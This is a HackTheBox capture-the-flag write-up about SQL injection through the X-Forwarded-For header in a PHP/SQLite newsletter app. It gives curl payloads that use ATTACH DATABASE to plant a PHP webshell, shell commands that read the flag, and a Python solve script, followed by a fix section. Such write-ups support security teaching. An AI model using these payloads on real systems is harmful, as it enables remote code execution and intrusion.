---
title: "Intergalactic Post"
date: 2027-06-04 09:00:00 -0500
categories: [HackTheBox, Challenges, Web]
tags: [hackthebox, challenge, web, sqli, sqlite, rce, attach-database, header-injection]
description: "An Easy Web challenge — a PHP newsletter app where the visitor's IP from X-Forwarded-For is inserted unsanitized into a SQLite query via exec(), which supports stacked queries. ATTACH DATABASE writes a PHP webshell into the web root, and the SQLite binary header is bypassed with strings to read the output."
---

## Overview

Intergalactic Post is an Easy Web challenge: a PHP newsletter subscribe form stores the
subscriber's IP address using the `X-Forwarded-For` header. That header value is
string-interpolated directly into a SQLite `INSERT` and executed via `SQLite3::exec()`,
which — unlike `query()` — supports semicolon-separated stacked queries. The attack
chains [SQL injection](https://cwe.mitre.org/data/definitions/89.html) through
`ATTACH DATABASE` to write a PHP webshell into the web root, then reads the flag with
a curl call filtered through `strings`.

## The technique

`SubscriberModel.php` reads the raw visitor IP from PHP's superglobal:

```php
return $_SERVER["HTTP_X_FORWARDED_FOR"];
```

`Database.php` inserts it without parameterization:

```php
// vulnerable
$db->exec("INSERT INTO subscribers (ip_address, email) VALUES('$ip_address', '$email')");
```

`exec()` executes all semicolon-delimited statements in one call. Injecting into the
`X-Forwarded-For` header lets an attacker append arbitrary SQL — specifically:

```sql
ATTACH DATABASE '/www/shell.php' AS lol;
CREATE TABLE lol.pwn (dataz text);
INSERT INTO lol.pwn (dataz) VALUES ('<?php system($_GET[cmd]); ?>');
```

SQLite creates a binary database file at `/www/shell.php`. That file contains the PHP
tag as a row value. PHP's parser scans every file for `<?php ?>` tags regardless of
surrounding binary content, so the webshell executes normally.

**Single-quote gotcha:** `$_GET['cmd']` contains single quotes that would close the SQL
string literal and corrupt the `INSERT`. The fix is the bare-word form `$_GET[cmd]` —
PHP treats an unquoted array key as a string (producing `E_NOTICE` but working
correctly).

**SQLite binary header:** The resulting file starts with `SQLite format 3...` bytes
before the `system()` output. Pipe `curl` through `strings` to extract the printable
lines.

## Solution

### 1 — Confirm the injection surface

```bash
curl -s -X POST "http://TARGET/subscribe" \
  -d "email=x@x.com" \
  -H "X-Forwarded-For: test_ip"
```

A `302` redirect to `/?success=true` confirms the IP was stored. The `email` field goes
through `FILTER_VALIDATE_EMAIL` so only the header is injectable.

### 2 — Inject the webshell

```bash
curl -s -X POST "http://TARGET/subscribe" \
  -d "email=x@x.com" \
  -H "X-Forwarded-For: ', 'x');ATTACH DATABASE '/www/shell.php' AS lol;CREATE TABLE lol.pwn (dataz text);INSERT INTO lol.pwn (dataz) VALUES ('<?php system(\$_GET[cmd]); ?>');-- -"
```

### 3 — Verify RCE and read the flag

```bash
curl -s "http://TARGET/shell.php?cmd=id" | strings | grep uid
# uid=1000(www) gid=1000(www) groups=1000(www)

curl -s "http://TARGET/shell.php?cmd=ls+/" | strings | grep flag
# flag_d055c3346bc2c02.txt

curl -s "http://TARGET/shell.php?cmd=cat+/flag_d055c3346bc2c02.txt" | strings | grep HTB
# HTB{...}
```

### Automated solve script

Create `solve.py`:

```python
#!/usr/bin/env python3
import sys, requests, re, time

TARGET = sys.argv[1]          # host:port
BASE = f"http://{TARGET}"
SHELL_PATH = "/www/shell.php"
SHELL_URL = f"{BASE}/shell.php"

def sqli_inject(ip_payload):
    return requests.post(f"{BASE}/subscribe", data={"email": "x@x.com"},
                         headers={"X-Forwarded-For": ip_payload},
                         allow_redirects=False).status_code

PHP_SHELL = "<?php system($_GET[cmd]); ?>"
payload = (
    f"', 'x');"
    f"ATTACH DATABASE '{SHELL_PATH}' AS lol;"
    f"CREATE TABLE lol.pwn (dataz text);"
    f"INSERT INTO lol.pwn (dataz) VALUES ('{PHP_SHELL}');-- -"
)
print("[*] Injecting webshell...")
sqli_inject(payload)
time.sleep(0.5)

r = requests.get(SHELL_URL, params={"cmd": "id"})
uid_line = next((l for l in r.text.splitlines() if "uid" in l or "www" in l), None)
if not uid_line:
    print("[-] Webshell not responding")
    sys.exit(1)
print(f"[*] RCE: {uid_line.strip()}")

r = requests.get(SHELL_URL, params={"cmd": "ls /"})
flag_name = re.search(r'flag\S+', r.text).group().strip()
r = requests.get(SHELL_URL, params={"cmd": f"cat /{flag_name}"})
flag = re.search(r'HTB\{[^}]+\}', r.text)
if flag:
    print(f"[+] FLAG: {flag.group()}")
```

Run it:

```bash
python3 solve.py TARGET:PORT
```

## Why it worked

| Layer | Root cause |
|---|---|
| `X-Forwarded-For` trusted blindly | PHP's `$_SERVER["HTTP_X_FORWARDED_FOR"]` is attacker-controlled and is never validated |
| `SQLite3::exec()` vs `query()` | `exec()` runs all statements in the string; `query()` only runs the first — the vulnerability requires `exec()` |
| `ATTACH DATABASE` privilege | SQLite grants any connected process the ability to create a new database file at any writable path |
| PHP tag scanning | PHP does not require a file to be pure PHP — it scans for `<?php ?>` in any content, including a binary SQLite file |

## Fix

```php
// 1. Validate the header value before touching the database
$ip = filter_var(
    $_SERVER['HTTP_X_FORWARDED_FOR'],
    FILTER_VALIDATE_IP
) ?: '';

// 2. Parameterized query — injection is structurally impossible
$stmt = $db->prepare(
    'INSERT INTO subscribers (ip_address, email) VALUES (?, ?)'
);
$stmt->bindValue(1, $ip);
$stmt->bindValue(2, $email);
$stmt->execute();
```

Both layers are needed: validation rejects malformed headers, and parameterization
ensures no user input can ever be interpreted as SQL regardless of what passes
validation.
